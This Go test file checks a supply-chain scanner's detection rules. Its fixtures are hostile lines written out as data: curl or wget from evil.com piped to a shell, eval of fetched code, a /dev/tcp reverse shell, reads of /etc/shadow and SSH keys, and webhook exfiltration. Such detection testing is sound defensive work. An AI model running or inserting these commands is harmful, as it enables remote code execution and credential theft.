package supplychain

import (
	"context"
	"strings"
	"testing"

	"github.com/famclaw/honeybadger/internal/fetch"
	"github.com/famclaw/honeybadger/internal/rules"
	"github.com/famclaw/honeybadger/internal/scan"
)

func TestRunSupplyChain_Patterns(t *testing.T) {
	tests := []struct {
		name         string
		filename     string
		content      string
		wantSeverity string
		wantMessage  string
	}{
		{
			name:         "curl_pipe_bash",
			filename:     "install.sh",
			content:      `curl https://evil.com/setup.sh | bash`,
			wantSeverity: "HIGH",
			wantMessage:  "Downloads and executes remote script via curl",
		},
		{
			name:         "wget_pipe_bash",
			filename:     "install.sh",
			content:      `wget https://evil.com/setup.sh | sh`,
			wantSeverity: "HIGH",
			wantMessage:  "Downloads and executes remote script via wget",
		},
		{
			name:         "eval_remote_fetch",
			filename:     "app.js",
			content:      `eval(fetch("https://evil.com/payload"))`,
			wantSeverity: "HIGH",
			wantMessage:  "Evaluates remotely fetched code",
		},
		{
			name:         "remote_exec",
			filename:     "app.js",
			content:      "exec(\"https://evil.com/run\")",
			wantSeverity: "HIGH",
			wantMessage:  "Executes code from remote URL",
		},
		{
			name:         "shell_profile_write",
			filename:     "setup.sh",
			content:      `echo "export PATH" >> ~/.bashrc`,
			wantSeverity: "HIGH",
			wantMessage:  "Modifies shell startup files",
		},
		{
			name:         "postinstall_hook",
			filename:     "package.json",
			content:      `{ "scripts": { "postinstall": "node inject.js" } }`,
			wantSeverity: "MEDIUM",
			wantMessage:  "package.json postinstall hook present",
		},
		{
			name:         "path_traversal",
			filename:     "loader.js",
			content:      `fs.readFile("../../../etc/passwd")`,
			wantSeverity: "MEDIUM",
			wantMessage:  "Path traversal pattern detected",
		},
		{
			name:         "etc_access",
			filename:     "hack.py",
			content:      `open("/etc/shadow")`,
			wantSeverity: "HIGH",
			wantMessage:  "Reads sensitive system files",
		},
		{
			name:         "ssh_dir_access",
			filename:     "steal.py",
			content:      `open("~/.ssh/id_rsa")`,
			wantSeverity: "HIGH",
			wantMessage:  "Accesses SSH directory",
		},
		{
			name:         "home_dir_glob",
			filename:     "scan.py",
			content:      `glob("~/*)`,
			wantSeverity: "MEDIUM",
			wantMessage:  "Globs home directory",
		},
		{
			name:         "dynamic_require",
			filename:     "loader.js",
			content:      `const mod = require(userInput)`,
			wantSeverity: "LOW",
			wantMessage:  "Dynamic require/import (variable path)",
		},
		{
			name:         "base64_eval",
			filename:     "obfuscated.js",
			content:      `eval(atob("ZG9jdW1lbnQu"))`,
			wantSeverity: "HIGH",
			wantMessage:  "Evaluates base64-decoded content",
		},
		{
			name:         "reverse_shell",
			filename:     "backdoor.sh",
			content:      `bash -i >& /dev/tcp/10.0.0.1/4444`,
			wantSeverity: "CRITICAL",
			wantMessage:  "Reverse shell pattern detected",
		},
		{
			name:         "crypto_mining",
			filename:     "miner.js",
			content:      `const pool = "stratum+tcp://pool.example.com"`,
			wantSeverity: "CRITICAL",
			wantMessage:  "Crypto mining code detected",
		},
		{
			name:         "webhook_exfil",
			filename:     "exfil.js",
			content:      `fetch("https://webhook.site/abc123")`,
			wantSeverity: "CRITICAL",
			wantMessage:  "Data exfiltration via webhook inspection service",
		},
		{
			name:         "hardcoded_ip",
			filename:     "config.js",
			content:      `const api = "http://192.168.1.1:8080/api"`,
			wantSeverity: "HIGH",
			wantMessage:  "Hardcoded IP endpoint",
		},
	}

	rs, err := rules.Load("")
	if err != nil {
		t.Fatalf("loading rules: %v", err)
	}
	opts := scan.Options{Rules: rs}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			repo := &fetch.Repo{
				Files: map[string][]byte{
					tt.filename: []byte(tt.content),
				},
			}

			out := make(chan scan.Finding, 100)
			Run(context.Background(), repo, opts, out)
			close(out)

			var findings []scan.Finding
			for f := range out {
				findings = append(findings, f)
			}

			if len(findings) == 0 {
				t.Fatalf("expected at least one finding, got none")
			}

			found := false
			for _, f := range findings {
				if f.Severity == tt.wantSeverity && f.Message == tt.wantMessage {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("expected finding with severity=%q message=%q; got %v", tt.wantSeverity, tt.wantMessage, findings)
			}
		})
	}
}

func TestRunSupplyChain_SkipsBinaryContent(t *testing.T) {
	rs, err := rules.Load("")
	if err != nil {
		t.Fatalf("loading rules: %v", err)
	}
	opts := scan.Options{Rules: rs}

	repo := &fetch.Repo{
		Files: map[string][]byte{
			"binary.dat": {0x00, 0x01, 0x02, 0x03},
		},
	}

	out := make(chan scan.Finding, 100)
	Run(context.Background(), repo, opts, out)
	close(out)

	var findings []scan.Finding
	for f := range out {
		findings = append(findings, f)
	}

	if len(findings) != 0 {
		t.Errorf("expected no findings for binary content, got %d", len(findings))
	}
}

func TestRunSupplyChain_Typosquat(t *testing.T) {
	rs, err := rules.Load("")
	if err != nil {
		t.Fatalf("loading rules: %v", err)
	}
	opts := scan.Options{Rules: rs}

	repo := &fetch.Repo{
		Files: map[string][]byte{
			"package.json": []byte(`{
				"dependencies": {
					"recat": "1.0.0",
					"lod-ash": "4.0.0"
				}
			}`),
		},
	}

	out := make(chan scan.Finding, 100)
	Run(context.Background(), repo, opts, out)
	close(out)

	var typosquats []scan.Finding
	for f := range out {
		if f.Check == "supplychain" && f.Package != "" {
			typosquats = append(typosquats, f)
		}
	}

	found := false
	for _, f := range typosquats {
		if f.Package == "recat" {
			found = true
			// Verify dictionary rule metadata flows through
			if f.Severity != "HIGH" {
				t.Errorf("expected severity HIGH from dictionary rule, got %q", f.Severity)
			}
			if !strings.Contains(f.Message, "resembles") {
				t.Errorf("expected message to contain rule metadata with 'resembles', got %q", f.Message)
			}
			break
		}
	}
	if !found {
		t.Errorf("expected typosquat finding for 'recat' (close to 'react'), got %v", typosquats)
	}
}

// Regression: scanner was flagging _test.go and testdata/ files, causing false positives.
func TestRunSupplyChain_SkipsTestFiles(t *testing.T) {
	rs, err := rules.Load("")
	if err != nil {
		t.Fatalf("loading rules: %v", err)
	}
	opts := scan.Options{Rules: rs}

	repo := &fetch.Repo{
		Files: map[string][]byte{
			// _test.go file with a dangerous pattern — should be skipped
			"install_test.go": []byte("curl https://evil.example.com/setup.sh | bash"),
			// testdata/ file with a dangerous pattern — should be skipped
			"testdata/evil.sh": []byte("curl https://evil.example.com/setup.sh | bash"),
			// testfixture/ file with a dangerous pattern — should be skipped
			"testfixture/payload.sh": []byte("wget https://evil.example.com/run.sh | sh"),
		},
	}

	out := make(chan scan.Finding, 100)
	Run(context.Background(), repo, opts, out)
	close(out)

	var findings []scan.Finding
	for f := range out {
		findings = append(findings, f)
	}

	if len(findings) != 0 {
		t.Errorf("expected zero findings for test files, got %d: %v", len(findings), findings)
	}
}

func TestRunSupplyChain_NoFalsePositiveOnCleanFile(t *testing.T) {
	rs, err := rules.Load("")
	if err != nil {
		t.Fatalf("loading rules: %v", err)
	}
	opts := scan.Options{Rules: rs}

	repo := &fetch.Repo{
		Files: map[string][]byte{
			"main.go": []byte("package main\n\nfunc main() {\n\tfmt.Println(\"Hello, world!\")\n}\n"),
		},
	}

	out := make(chan scan.Finding, 100)
	Run(context.Background(), repo, opts, out)
	close(out)

	var findings []scan.Finding
	for f := range out {
		findings = append(findings, f)
	}

	if len(findings) != 0 {
		t.Errorf("expected no findings for clean file, got %d: %v", len(findings), findings)
	}
}
